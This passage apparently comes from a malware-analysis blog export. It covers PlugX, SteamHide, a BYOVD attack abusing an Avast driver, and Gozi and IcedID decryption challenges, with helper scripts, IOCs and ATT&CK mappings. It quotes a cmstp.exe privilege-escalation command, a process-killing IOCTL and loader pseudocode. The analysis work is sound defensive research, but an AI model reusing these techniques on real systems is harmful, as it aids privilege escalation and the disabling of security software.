script\napi name resolve script\nimport pefile\n \ndef custom_hash(input_str):\n    hash_value = 0xC0DE1337\n    i = 0\n \n    while True:\n        chr_value = ord(input_str[i]) if i &lt; len(input_str) else 0\n        if not chr_value:\n            break\n        \n        hash_value ^= chr_value + ((hash_value &gt;&gt; 8) | (hash_value &lt;&lt; 24) &amp; 0xFFFFFFFF)\n    \n        i += 1\n \n    return hex(hash_value &amp; 0xFFFFFFFFFFFFFFFF)\n \ndef api_hash_resolve(dllToLoad, hashToResolve):\n    pe = pefile.PE(f&#039;C:\\Windows\\SysWOW64\\{dllToLoad}&#039;)\n \n    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:\n        if exp.name is not None:\n            if custom_hash(exp.name.decode()) == hex(int(hashToResolve, 16)):\n                print(exp.name.decode())\n \ndef main():\n    dllList = [&quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;, &quot;user32.dll&quot;]\n    \n    print(f&quot;DLLs Available: \\n0: {dllList[0]}\\n1: {dllList[1]}\\n2: {dllList[2]}&quot;)\n    dllNumber = int(input(&quot;Choose DLL number: &quot;))\n    hashToResolve = input(&quot;Hash(hex) to Resolve: &quot;)\n \n    api_hash_resolve(dllList[dllNumber], hashToResolve)\n \nif &quot;__main__&quot; == __name__:\n    main()\n\nIndicatior of Compromises (IOCs)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFILE NAMESHA256Meeting invitaion.mscca0dfda9a329f5729b3ca07c6578b3b6560e7cfaeff8d988d1fe8c9ca6896da5ver.dat MSI file2d884fd8cfa585adec7407059064672d06a6f4bdc28cf4893c01262ef15ddb99LDeviceDetectionHelper.exe282fc12e4f36b6e2558f5dd33320385f41e72d3a90d0d3777a31ef1ba40722d6hid.dll the NIM loader1a37289c70c78697b85937ae4e1e8a4cebb7972c731aceaef2813e241217f009LDevice.dat37c7bdac64e279dc421de8f8a364db1e9fd1dcca3a6c1d33df890c1da7573e9fdomain used to downlaod MSI filehxxps[:]//cdn7s65[.]z13[.]web[.]core[.]windows[.]netdecrypted LDevice.dat ie. PlugX malwared7a4255297c91d26d726dec228379278b393486e6fa8a57b9b7a5176ca52f91eMeeting Invitation.pdf9d844b275725e6241f6e70d17ed68bb7eb90b684832ef5952a91a5040ffe5d94connection madehxxps[:]//conflictaslesson[.]com[:]443\n\nMITRE ATT&amp;CK Techniques\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTACTIC: TECHNIQUEATT&amp;CK CODEInitial Access: Phishing - Spearphishing AttachmentT1566.001Initial Access: Phishing - Spearphishing LinkT1566.002Execution: User Execution - Malicious FileT1204.002Execution: Command and Scripting Interpreter: Visual BasicT1059.005Persistence: Boot or Logon Autostart Execution — Registry Run KeysT1547.001Defense Evasion: Hijack Execution Flow -  DLL Search Order HijackingT1574.001Defense Evasion: Hijack Execution Flow - DLL Side-LoadingT1574.002Defense Evasion: Deobfuscate/Decode Files or InformationT1140Defense Evasion: System Binary Proxy Execution: MMCT1218.014Defense Evasion: System Binary Proxy Execution: MsiexecT1218.007Defense Evasion: Masquerading: Match Legitimate Name or LocationT1036.005Defense Evasion: Masquerading: Double File ExtensionT1036.007\n\nFootnotes\n\n\nHow to Analyze Malicious MSI Installer Files ↩\n\n\nMSI Shenanigans. Part 1 - Offensive Capabilities Overview ↩\n\n\nChinese APT Abuses VSCode to Target Government in Asia ↩\n\n\nTHREAT ANALYSIS REPORT: PlugX RAT Loader Evolution ↩\n\n\nUnmasking the Enigma: A Historical Dive into the World of PlugX Malware ↩\n\n\n"},"malware-analysis/steamhide-analysis/part01":{"slug":"malware-analysis/steamhide-analysis/part01","filePath":"malware-analysis/steamhide-analysis/part01.md","title":"SteamHide Malware Analysis : Part I","links":["malware-analysis/steamhide-analysis/part01"],"tags":["reverse-engineering","malware-analysis","steamhide"],"content":"What’s this blog\nThis post explores an interesting malware SteamHide which abuses Steam servers to host malware within steam profile images to serve payloads for malware downloaders. Threat Actors can update already infected machines just by adding new images to steam profile.\nAlso, this malware was an assignment for us to analysis from the course Windows Malware Analysis for Hedgehogs, huge shoutout to Karsten Hahn for this brilliant course.\n\nSo, let’s start with initial triage the most important step when analyzing a new sample\nInitial triage for Hide binary inside image.exe\nFile identification\n\nThe DIE  output shows it’s a PE 32bit .NET Executable, which can be assured with the presence of CLR runtime header in data directory of this sample. We can use dnSpy to further analyse the functionality of this sample.\nStrings to attach\n\nTaking a look at strings output reveals eye catching strings like\n\nuser agents and urls indicates possible internet commnuication\na gibberish but interesting looking string\nan executable file name steam.exe\nand many cryptography related strings and functions, where TripleDES stands out indicating possible algorithm used here\n\nThe way it behaves\nStarts with Form_Load()\n\n\ninitializing a variable String text having a string containing an html image tag including a regex URL in src attribute\nmoving on we see a WebClient.DownloadString method which downloads the mentioned URL’s source code as String to store in variable String text2\nRegex.Match(String input, String pattern) method used to search for a pattern(text) in specified input string(the source code in text2),  on success it will extract and store the matched string inString value using Groups[1].Value which reveals an image url\nnext WebClient.DownloadData(String) method used to download the image resource from URL stored in value and save as a byte array in variable byte[] array, then convert it to a image class object using Image.fromStream(Stream) method (after converting the byte array array  to a memory stream), in the very next line,Image.GetPropertyItem(Int32) is used which returns the PropertyItem Class  for specified ID value 34675(0x8773), a quick look at MSDN page PropertyItem.Id Property shows that ID 0x8773 refers to PropertyTagICCProfile property tag ie. ICC profile embedded in the image.\n\n\nTIP#1: You can view ICC profile of an image using exif data parser like exiftool and use command exiftool.exe -icc_profile -d -w icc [yourImage] to extract to a separate .icc file\n\n\nWe see a call to DecryptBytes() with arguments passed are ICC profile data from value2, password string {PjlD\\bzxS#;8@\\x.3JT&amp;&lt;4^MsTqE0, an integer value 192 for iterations,\nwhich calls another method CryptBytes() with all the above three arguments plus the process set to decryption via enum CryptProc.DECRYPT, we’ll resume onto the cryptography stuff in a bit, moving on, File.WriteAllBytes(String, Byte[]) method used which will create a new executable file steam.exe, write the specified byte array array2(storing the decrypted second stage binary data),\nIn the end it will execute steam.exe by starting a new process using Process.Startmethod\n\nForm1_CryptBytes(): old fashioned Cryptography Stuff\nAs we saw earlier, there was a call to CryptBytes() method, let’s take a look\n\n\nCreates a PasswordDeriveBytes object to derive key from password string, key salt to use, hash algorithm set to SHA256, number of iterations to perform\nTripleDES.Create method used to perform TripleDES algorithm, then key and IV properties are set using PasswordDeriveBytes.GetBytes()\nnow the stream transformation (ICryptoTransform cryptoTransform) to perform is set using ?:(ternary) operator based on whatevercryptProc is set, which gives either encryptor(TriplesDES.CreateEncryptor()) or decryptor(TripleDES.CreateDecryptor())\ncreates aCryptoStream instance cryptoStream with a target data stream(MemoryStream memoryStream), transformation to use cryptoTransform, and the mode of stream set to write access CryptoStreamMode.Write, then writes to memoryStream the transformed bytes from plain\nin the end either encrypted or decrypted byte array(memoryStream.ToArray()) is returned\n\nDecryption recipe\nHere’s the cyberchef decryption recipe to decrypt the ICC profile\n\nNOTE: As of writing this post, when i ran the sample, the steam profile image source code does not return the intended image url, which is why the steam.exe turn out to be invalid executable. So, I’m gonna move on with image provided with assignment beforehand just for such cases, check the hash below.\n\n\nIOCs : how to tell if a system is compromised\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHide binary inside image.exe148914b6c64c51130a42159e4100e6eb670852901418d88c1c0383bf0cd1e339blink.jpg : downloaded image provided with assignmentc0b7af1dd476effd0697ffac71c1124d3f086d88945c57cc45096d712e6386cbFinalMalware.exe(steam.exe) : decrypted from ICC profileb41868a6a32a7e1167f4e76e2f3cf565b6c0875924f9d809d889eae9cb56a6aeconnection made to the steam profile image linkhxxps://steamcommunity[dot]com/id/advance40/images\nThis concludes the first part of analyzing SteamHide in the very next post we will go through the second stage and explore the functionalities.\nSee you there :)"},"malware-analysis/steamhide-analysis/part02":{"slug":"malware-analysis/steamhide-analysis/part02","filePath":"malware-analysis/steamhide-analysis/part02.md","title":"SteamHide Malware Analysis : Part II","links":["malware-analysis/steamhide-analysis/"],"tags":["reverse-engineering","malware-analysis","steamhide"],"content":"Welcome back :D,\nThis post is the continuation of SteamHide malware analysis, here we’ll go through the second stage FinalMalware.exe dropped by Hide binary inside image.exe downloader by decrypting the ICC profile after pulling out image from stream profile images. Let’s get started!!\nInitial triage for FinalMalware.exe\nFile identification\n\nAgain DIE and PortexAnalyzer outputs indicates that it’s a PE 32bit .NET managed assembly file, we’ll use dnSpy for further examination\nStrings to attach\nWhen a .NET binary is not obfuscated then the strings are good giveaways to its capabilities prior analysis.\n\nSome interesting strings are follows\n\nsystem executable file cmstp.exe\nsome registry hives and registry manipulating functions\nfunctions related to file discovery\nsome random but interesting strings like BroMal, broVPN, uNoFGmsEX and so on\nstring mentioning Temp\\ directory\nsome pastebin urls\nstring mentioning a virtual machine VMware\n\nHow does it behave\nStarts with Form1_Load()\n\nEvasion.IsInsideVM() : Anti-VM Check\n\n\nperforms a typical anti-vm technique MITRE ATT&amp;CK T1497.001. This method checks the presence of virtual machine by making a query via SelectQuery() on Win32_DiskDrive WMI class which represents a physical disk drive of computer running the Windows,\nwhen the ManagementObjectSearcher.Get() method on this object is invoked, the ManagementObjectSearcher executes the given query and returns a collection of management objects(ManagementObjectCollection) that matches the query, then loop through collection to get the value of Win32_DiskDrive.Caption property. But checks for only two VM entries ie. VBOX and VMware, childish enough ‘cause when i debugged this sample in my QEMU based Windows VM, the caption value was QEMU HARDDISK, resulting in no VM dectection, as you can see below:\n\n\n\nTIP#2: In powershell, run Get-WmiObject -Class Win32_DiskDrive to check your VM’s caption value\n\nAdmin.Check(): are you the admin\nOn a successful Anti-VM check, it gets the current users WindowsPrincipal(WindowsIdentity.GetCurrent()) windows Identity to check if the user has admin role or not by calling WindowsPrincipal.IsInRole method with WindowsBuiltInRole.Administrator enum which returns a boolean respectively.\nEvasion.CheckFirstRun(): am i new here\nif user is not admin, checks if the file named ie. uNoFGmsEX\\uNoFGmsEX..txt exist under Local Application Data folder of user ie. %LOCALAPPDATA%, if not, then creates one, as shown in Procmon output\n\nForm1.TryPrivilegeEscalation(): want some power\nif the sample is running  for the first time, then it will try to escalate privileges by utilising the technique MITRE ATT&amp;CK T1218.003 which is performed by exploiting system binary cmstp.exe using the command  C:\\Windows\\system32\\cmstp.exe&quot; /au C:\\Windows\\Temp\\[randomFileName].inf which in turn runs the malware with elevated privilege, here’s more on the topic cmstp.exe as lolbin.\nSee the process in action below\n\nForm1.AddPersistence(): lemme settle for later\n\nWhen this sample runs itself with admin privilege via cmstp.exe, it persist by making auto run key by setting the registry key Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run: BroMal with value set to the malware path itself\n\n\nwhat’s with the shortcuts\n\nPopulateSearchPaths(): stores the paths to user Desktop and Documents folder to ShortcutUtils.searchPaths array\nPopulatedShortcuts(): which calls ShortcutUtils.EnumerateShortcuts() to traverse through every directory and sub-directories within searchPaths looking for the *.lnk files, if found then add to the ShortcutUtils.shortcutList list variable\nthen nothing is done with that at least as of now\n\nApp.EnumerateVulnerable() : your weakness\nThe malware seems to look for the existence of a SquirrelTemp\\SquirrelSetup.log, if found then saves the path, but nothing is done with that info. Maybe to further exploit them\nThen the sample abruptly ends.\n\nwhat does future holds for SteamHide\nThis version of sample lacks functionality and there’s are many code segments that are either incomplete or not used by now, like:\n\nthere’s a method CreateTwitterRequest which allows making twitter requests, which can be used as twitter bot for C2 and stuff\nCheckMutexRunning : create a mutex which can be used to avoid re-infecting the system\nCodePieceManager class : contains method regarding compiling source code to MSIL assembly, maybe to add functionality on the fly\nUpdater class: which can be used to update to a new version in the same way done by hide binary inside image.exe downloader\n\n\nIOCs\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFinalMalware.exeb41868a6a32a7e1167f4e76e2f3cf565b6c0875924f9d809d889eae9cb56a6aeAutoRun StartUp Registry KeyBroMal reg key with value being path to malware itselfFile dropped to check first run%LOCALAPPDATA%\\uNoFGmsEX\\uNoFGmsEX..txtinf file dropped for cmstp.exeC:\\Windows\\Temp\\[randomFileName].inf\nI had fun analyzing this sample and learned a lot in the meantime.\nHere’s the first hand report by Karsten Hahn Picture this: Malware Hides in Steam Profile Images\nThanks for tuning in, I’ll see you around :)"},"misc/guardians-paradox":{"slug":"misc/guardians-paradox","filePath":"misc/guardians-paradox.md","title":"Guardians Paradox : When Protector becomes Predator (Malware Version)","links":[],"tags":["reverse-engineering","malware-analysis","infection-chain","malware-campaign"],"content":"The introduction\nWelcome back!.. hope you’re having a nice time :)\n\n“We often trust our security software to stand as an unbreakable wall against malware and attacks, but what happens when that very wall is weaponized against us?”\n\nIn this blog, we’ll analyse a malware and learn along the way, which was found in a recent discovery by Trellix Advanced Research Center 12 that reveals a malware campaign that weaponizes a legitimate Avast Anti-Rootkit driver(aswArPot.sys) to bypass security measures.\nThe malware exploits or manipulates the driver’s kernel level access to disable and terminate security processes, and take control of the infected system. This campaign is good enough example of often used BYOVD(Bring Your Own Vulnerable Driver) attack which focuses on exploiting legitimate but vulnerable drivers to gain kernel-level access to bypass the antivirus and EDR solution.\n\n“What a good way to bypass the security vendors is to terminate them right away”\n\nSuch behavior is lethal and sinister as it straight up terminates\nthe security vendors process. Let’s get into the technicals of this malware.\n\nThe infection chain\nThe infection chain starts with malware kill-floor.exe that is a PE64 console application that drops an embedded legitimate and trusted Avast Anti-Rootkit Kernel Driver (aswArPot.sys).\n\nOnce dropped, the malware creates a service that points to this driver and deploys right away using windows utility Service Control (sc.exe), then enters an endless loop of fetching the security vendor processes running on infected system and instructing the kernel driver to eliminate them using an IOCTL code specific to this driver, all happening silently under the trust of this legitimate driver raising no alarms.\n\nLaying the foundation\nThe malware starts off by defining following 142 hardcoded process names of well-known antivirus and EDR solutions to compare against running processes of infected system down the line:\n\nthen initiates the plot by dropping the legitimate Avast Anti-Rootkit kernel driver disguised as ntfs.bin in the C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows directory, that is stored at offset 0x2B880 of this file, using file manipulation function like fwrite(), fopen_s() and fclose():\n\nwhich is captured in Process Monitor from Sysinternals Suite aka procmon:\n\nand taking a look at destination folder confirms the drop and digital signature verify the legitimacy of innocent driver:\n\nI’ve written a quick python automation script to extract the driver from the initial malware:\n \n# filename : extract-driver.py\n# author : theabsnt :)\n \ndef main():\n   with open(&#039;sample-kill-floor.exe&#039;, &#039;rb&#039;) as f:\n        # offset to embedded driver in this file is 0x2B880\n        # the driver size is 0x32C98\n        content = f.read()[0x2B880 : 0x2B880+0x32C98]\n        \n        with open(&#039;vuln-driver-aswArPot.sys&#039;, &#039;wb&#039;) as f:\n            f.write(content)\n \nif __name__ == &quot;__main__&quot;:\n    main()\n\nThe persistence\nOnce the legitimate kernel driver is dropped, it establishes persistence by creating a service name aswArPot.sys using sc.exe(modifies services entries in Service Control Manager database of windows) with parameter binpath set to the path where driver was dropped:\n\nalso the procmon capture reflects the same, as we can see, cmd.exe child processes are spawned to run the supplied command to create and start the service right away:\n\n\nwhich can further be cross verified by AutoRun entry and checking the service properties:\n\n\nOn success, malware gains kernel-level access to the system, providing it with the ability to terminate security processes.\n\nLooking for the prey\nNext, it starts an infinite loop to iterate through all the process running on the system using a combination of three winAPI functions :\n\n\nCreateToolhelp32Snapshot with args 0x2(TH32CS_SNAPPROCESS) and 0 (indicating current process)\nalong with Process32FirstW and Process32NextW,\nthen compares each process name against list of 142 hard coded security vendors process names initially defined.\n\n\nThe termination\n\nOn process name match, the malware grabs the driver handle using CreateFileW function, if the handle to the driver is created, it calls DeviceIoControl function with arguments being IOCTL code of 0x9988c094 along with the target process ID.\nSince kernel mode drivers can override the user-mode processes, the Avast driver ends up terminating the asked processes, bypassing various tamper protection mechanism from antivirus, sounds brutal innit?\nUpon running the malware in my sandbox, it terminates the MsMpEng.exe ie. Microsoft Malware Protection Engine process and the console runs endlessly to kill process whenever a new one spawns:\n\n\nThe trigger\nThe Avast driver interprets the IOCTL code (0x9988c094) as a command to terminate the specified security process that is passed by the malware alongside the code.\nLooking at the disassembly of the driver we see a reference mentioning the IOCTL code is being compared(cmp instruction) below:\n\n\nthat later invokes the subroutine sub_14001DC80 which shows driver using Windows kernel functions KeAttachProcess, ZwOpenProcess and ZwTerminateProcess to terminate security processes on behalf of the malware.\n\nConclusion\nSuch behavior or loopholes raises question on the faith or trust we show on security vendors or antivirus.\nBundling and exploiting a legitimate binaries to carry out malicious intent is an often seen trend among malware campaigns. Likewise, in my previous blog we’ve discussed something along the line.\nSeems like this particular malware we’ve gone through is one of many component of this malware campaign, as the only job this malware does is to trick the Avast driver to kill specified process.\nAnyways, it was fun exploring this malware, learned a lot and i hope you got some values off of it.\nI’ll see you around, till then have a nice time :)\n\nIndicator of compromise(IOC)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFILE NAMEMD5 HASHkill-floor.exe40439f39f0195c9c7a3b519554afd17antfs.bina179c4093d05a3e1ee73f6ff07f994aa\n\n\n\n\n\n\n\n\n\n\n\n\n\nSERVICE NAMEBINPATHaswArPot.sysC:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\n\nMITRE ATT&amp;CK Techniques\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTACTIC: TECHNIQUEATT&amp;CK CODEPersistence: Create or Modify System Process - Windows ServiceT1543.003Defense Evasion: Exploitation for Defense EvasionT1211Defense Evasion: RootkitT1014Execution: Native APIT1106Execution: System Services - Service ExecutionT1569.002\nFootnotes\n\n\nNew Malware Uses Legitimate Antivirus Driver to Bypass All System Protections ↩\n\n\nWhen Guardians Become Predators: How Malware Corrupts the Protectors ↩\n\n\n"},"z2a-biweekly-challenges/ch01_gozi_string_decryption":{"slug":"z2a-biweekly-challenges/ch01_gozi_string_decryption","filePath":"z2a-biweekly-challenges/ch01_gozi_string_decryption.md","title":"Z2A Challenge-01 : Gozi String Decryption","links":[],"tags":["reverse-engineering","malware-analysis","zero2auto","gozi-malware"],"content":"what’s the agenda\nWelcome back :)\nToday we’ll go through a challenge from Zero2Automated: Advanced Malware Analysis which ask us to reverse engineer the string decryption routine and write an automation script for it.\nThe sample provided is a Gozi/ISFB malware which is couple of years old and is packed, also checking file entropy of 7.5 says many random bytes are present which supports file being packed.\nIt’s a PE32 DLL file with SHA256 hash of 0a66e8376fc6d9283e500c6e774dc0a109656fd457a0ce7dbf40419bc8d50936. Strings output consist mostly of random strings, with some noticeable strings here n there like a PDB file path d:\\in\\the\\town\\where\\ahung.pdb and a file name myfile.exe in version info.\n\nfirst stage: something to unpack\nLets get started with unpacking the payload\n\nto unpack we gonna use x32dbg to debug and apply breakpoints on widely used windows API for unpacking and stuff like VirtualAlloc for memory allocation, VirtualProtect for memory protection changes, CreateProcessInternalWand CreateProcessA in case of process creation,\nnow executing the sample we encounter three consecutive VirtualAlloc call, where first address when filled looks gibberish, second address (in Dump 2) reveals a MZ header but looks kinda compressed and third address (in Dump 3) is also filled with MZ header but with a .bss section and looks clean than prior, followed by a VirtualProtect call on itself\n\nassuming Dump 3 gonna be the next payload, we dump the memory to new file and unmap it using pe_unmapper or manually using PEbear, doing this will provide us an unpacked second stage ready to analyze further with IDA and Ghidra.\n\n\nsecond stage: finding the decryption routine\nTaking an overview, we see it imports 3 libraries with interesting functions like:\n\nfrom NTDLL.dll imports system query related function: NtQuerySystemInformation\nfrom KERNEL32.dll imports process and thread manipulating functions: SetThreadPriority, GetCurrentThread, OpenProcess, CreateEventA, QueueUserAPC\nnot much from ADVAPI32.dll\n\nand only exports DllRegisterServer, also not much from string output can be seen other than imports.\nAlso you’ll notice .bss section does not show any symbols which indicates possible encrypted bytes, keeping this in mind, we’ll start with DllEntryPoint\nDllEntryPoint: the entrance\nGiving it an overview we encounter a function call sub_10002009 which takes another sub_10001B7F as an argument,\n\n\nnow sub_10002009 practices process injection sub-technique known as APC Injection(see MITRE ATT&amp;CK T1055.004) which is done by creating a thread using CreateThread that will execute a SleepEx which triggers the execution of sub_10001B7F, see the action below\n\nsub_10001B7F: the function invoked\n\nHere it sets the current thread priority to THREAD_PRIORITY_BELOW_NORMAL, then calls sub_10001308\nsub_10001308: preparing the decryption\nfirst it calls sub_100010C4 which creates an unnamed event using CreateEventA, then using OpenProcess gets the handle to the current process with custom access right ie. 0x10147a (Query information, Create threads, VM operation, VM read, VM write, Duplicate handles, Synchronize) and returns,\n\non success, calls NtQuerySystemInformation API to get the SystemProcessorPerformanceInformation struct and stores in allocated heap of 0x30 bytes, after some calculation with output struct which includes a modulo 19, it will generate a number to pass as an argument to sub_1000197C\nsub_1000197C: decryption follows\nthis calls sub_10001922 which takes handle to this dll as one of the arguments to find .bss section and store its Virtual Address and SizeOfRawData\n\nthen next function called is sub_10001FD8(mem_allocated from VirtualAlloc, pointer to bss section, key, 0x400)\n\nwhere the key consist of (dword &quot;Apr&quot; + dword &quot;26 2022&quot; - 1) + bss_addr + number generated, in ghidra we can see the dword part is calculated beforehand ie. 0x5292a672.\nInside sub_10001FD8 the decryption goes like this:\n\nit takes a dword from encrypted bss section\nsubtracts it with the key\nthen add it to the previous bss dword\nand store the result in memory allocated (passed as first argument)\n\n\nthe decryption script\n# script.py\n \nimport pefile \nimport struct\n \ndef get_bss(pe):\n    for section in pe.sections:\n        if b&#039;.bss&#039; in section.Name:\n            return section.VirtualAddress, section.PointerToRawData, section.SizeOfRawData, section.get_data()\n \ndef gen_key(bss_va, date, random):\n    first_dword_date = struct.unpack(&quot;&lt;I&quot;,date[0:4])[0]\n    second_dword_date = struct.unpack(&quot;&lt;I&quot;,date[4:8])[0]\n    key = (first_dword_date + second_dword_date - 1) + bss_va + random\n    return key\n \ndef decrypt_bss(data, key):\n    prev_dword = 0\n    new_bss = b&quot;&quot;\n \n    for i in range(0, len(data), 4):\n        curr_dword = struct.unpack(&quot;I&quot;, data[i:i+4])[0]\n        if curr_dword:\n            new_bss += struct.pack(&quot;I&quot;,(curr_dword + (prev_dword - key)) &amp; 0xffffffff)\n            prev_dword = curr_dword\n        else:\n            break\n    return new_bss\n \ndef main():\n    sample = input(&quot;[?] the sample is: &quot;)\n    date = input(&quot;[?] and the campaign date: &quot;).encode()\n \n    pe = pefile.PE(sample)\n    bss_va, bss_raw, bss_raw_size, enc_bss  = get_bss(pe)\n \n    print(&quot;\\n[+] Info .bss section:&quot;)\n    print(f&quot;[+] - virtual address: {hex(bss_va)}&quot;)\n    print(f&quot;[+] - pointer to raw data: {hex(bss_raw)}&quot;)\n    print(f&quot;[+] - size Of raw data: {hex(bss_raw_size)}&quot;)\n    print()\n \n    for i in range(0, 20):\n        key = gen_key(bss_va, date, i)\n        print(f&quot;[*] trying key: {hex(key)} with num_gen: {i}&quot;)\n \n        dec_bss = decrypt_bss(enc_bss, key)\n        if b&#039;NTDLL&#039; in dec_bss:\n            print(f&quot;\\n[+] key found {hex(key)} where number genrated is {i}&quot;)\n            print(f&quot;\\n[+] decrypted .bss: \\n{dec_bss}&quot;)\n            break\n \n    # construct a new file with decrypted bss \n    pe_data = open(sample, &#039;rb&#039;).read()\n    final_patched_pe = pe_data[:bss_raw] + dec_bss + pe_data[bss_raw+len(dec_bss):]\n    open(&quot;gozi_decoded_bss.exe&quot;, &#039;wb&#039;).write(final_patched_pe)\n \nif __name__ == &quot;__main__&quot;:\n    main()\n \nOn the right of screenshot, we see the output from the above script and in the left we can see symbols in the decrypted bss section from created file:\n\nThat’s it for now :), hope you got some value off of it.\nI’ll see you around."},"z2a-biweekly-challenges/ch02-iced-config-extraction":{"slug":"z2a-biweekly-challenges/ch02-iced-config-extraction","filePath":"z2a-biweekly-challenges/ch02-iced-config-extraction.md","title":"Z2A Challenge-02 : IcedID Configuration Extraction","links":[],"tags":["reverse-engineering","malware-analysis","zero2auto","icedid-malware"],"content":"the agenda\nWelcome back!.. and i hope you’re having a nice time :)\nThis is a quick write-up that will go through the process of unpacking the initial IcedID malware loader and extract, decrypt and display the configuration from the unpacked stage of this malware,\n\nthis is the second challenge from the course Zero2Automated as part of their bi-weekly challenges\n\n\nthe file triage\nThe sample we’re provided with is a PE64 DLL file with SHA256 hash 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.\nWith some initial triage, it seems packed, as\n\nit has almost nothing to import,\nand exports DLLRegisterServer with six another function HdQZgnE, IfkPmdu, cJPSzqHBMN, pcufUY, rHqnYSA, zlmkoZLQMd\nstrings output is flooded with random bytes hinting packed state and interestingly literal hex values\nalso you may notice that being a dll it has no entry point set\n\nassumption: now that there happens to be no entry point set then the dll may be executed by it’s exported function, and we’ll do the same using the windows system utility run32dll.exe\n\nUsage: run32dll [dll_name], [export_name or #ordinal_number]\n\nthen run within a debugger and make sure to enable Events-&gt;break on-&gt;User DLL load from Options-&gt;Preferences of x64dbg\nhow to unpack though\nstage-01: the loader\nstarts off by calling sub_180005A13 a bunch of time to dynamically resolve the needed functions via PEB, then continue if current year is 2022 or terminate the process otherwise.\nWithin x64dbg run until VirtualAlloc followed by VirtualProtect is hit and checking the memory region reveals another MZ header ie. a executable file, dump that to disk (using OllyDumpEx in X64dbg)\n\nonce the PE is dumped successfully, we can move on with config extraction.\nhunting the config\nstage-02: the dumped PE\n\nThis DLL starts off by immediately making a call to CreateThread where lpStartAddress points to StartAddress ie.sub_180002AA4 and is executed, which calls another subroutine sub_180002174\n\nthis subroutine at first creates a number from CPU tick counts, then calls another subroutine sub_180002428 that will decrypt the .d section by XORing first 0x20 bytes against bytes 0x40 ahead resp. (see the config extraction script  for more),\n\n\nonce decrypted we see a config url ilekvoyn[.]com\nC:\\Users\\theabsnt\\Desktop&gt;python extract-config.py stage-2-iced-id.dll.vir\nDecrypted .b sections:\nb&#039;\\xd9o\\x8d\\x06ilekvoyn.com\\x00\\xafO\\xc2y\\xd2N\\xb6!\\xfd\\xbd@}u\\xd4\\x17&#039;\n\nCampaign URL: ilekvoyn.com\n\nafter decryption it moves on to gather various system related information by calling sub_180002860\n\nwhich forms a string with various system info, that will eventually be sent back to C2 url after establishing the connection down the line.\nThat’s it for now, hope you got some value off of it!\nI’ll see you around :)\n\nconfig extraction script\n# filename : extract-config.py\n# author : theabsnt :)\n# usage:  extract-config.py [unmapped_or_dumped_stage-02_icedid]\n \nimport pefile\nimport sys, struct\n \n \ndef decrypt_config(config_data):\n    decrypted_blob = b&quot;&quot;\n    for i in range(0x20):\n        decrypted_blob += bytes([config_data[i] ^ config_data[i+0x40]])\n    \n    return decrypted_blob\n    \ndef extract_config(decrypted_config):\n    url = decrypted_config[4:].split(b&quot;\\x00&quot;)[0].decode()\n    return url\n \ndef main():\n    pe = pefile.PE(sys.argv[1])\n    \n    config_data = None\n    for section in pe.sections:\n        if b&#039;.d\\x00&#039; in section.Name:\n            config_data = section.get_data()\n            \n    if config_data != None:\n        decrypted_blob = decrypt_config(config_data)\n        print(f&quot;Decrypted .b sections:\\n{decrypted_blob}&quot;)\n        print(f&quot;\\nCampaign URL: {extract_config(decrypted_blob)}&quot;)\n \n \nif __name__ == &quot;__main__&quot;:\n    main()"},"z2a-ch03-challenge/part01":{"slug":"z2a-ch03-challenge/part01","filePath":"z2a-ch03-challenge/part01.md","title":"Zero2Auto : CH03 Practical Analysis Challenge - Part I","links":["z2a-ch03-challenge/part02"],"tags":["reverse-engineering","zero2auto"],"content":"What’s up dudes!! This post is a walktrough of challenge binary from Chapter 03: Practical Analysis from Zero2Automated: Advanced Malware Analysis course. This challenge is set to make you comfortable with malware reversing and triage by covering variety of topics like API hashing, Anti-Debugging, PEB manipulation, Process Injection, Thread Context Hijacking, Unpacking Methods, Cryptography Algorithms and so on.\n\nIn this Part-I of this series we’ll walkthrough the base binary(stage01) ie. main_bin.exe. So, Let’s get into it!\n\nInside main()\nFollowing is the formatted pseudocode of main() based on IDA decompiler output:\nint __cdecl main(int argc, const char **argv, const char **envp) {\n\tdecrypt_str_401300(str_kernel32dll);\n\tdecrypt_str_401300(str_findResourceA);      \n\thMod = LoadLibraryA(str_kernel32dll);\n\tFindResourceA = GetProcAddress(hMod, str_findResourceA);\n \n\tdecrypt_str_401300(str_loadResource);\n\thMod = LoadLibraryA(str_kernel32dll);\n\tLoadResource = GetProcAddress(hMod, str_loadResource);\n \n\tdecrypt_str_401300(str_sizeOfResource);\n\thMod = LoadLibraryA(str_kernel32dll);\n\tSizeOfResource = GetProcAddress(hMod, str_sizeOfResource);\n \n\tdecrypt_str_401300(str_lockResource);\n\thMod = LoadLibraryA(str_kernel32dll);\n\tLockResource = GetProcAddress(hMod, str_lockResource);\n \n\t// gonna load the desired resource from .rsrc section \n\thRsrc = FindResourceA(NULL, 101, RT_RCDATA);      \n\thResLoad = LoadResource(NULL, hRsrc);\n\tdw_sizeOfRsrc = SizeOfResource(NULL, hRsrc);\n\tmalloc_wrapper_4038F4(dw_sizeOfRsrc + 0x1C);\n\tlpRsrcLock = LockResource(hResLoad);\n \n\t// dwSize_of_next_payload = based on some calculation with lpRsrcLock+0x8\n \n\tdecrypt_str_401300(str_virtualAlloc);\n\thMod = LoadLibraryA(str_kernel32dll);\n\tVirtualAlloc = GetProcAddress(hMod, str_virtualAlloc);\n \n\tlpAlloc_mem_for_stg02 = VirtuaAlloc(0, dwSize_of_next_payload, MEM_COMMIT, PAGE_READWRITE);\n\tpossible_memcpy_402DB0(lpAlloc_mem, lpRsrcLock+0x1C, dwSize_of_next_payload);\n \n\tpossible_memset_4025B0(S_array, 0, 0x102); \n\t//then rc4 decryption routine(with 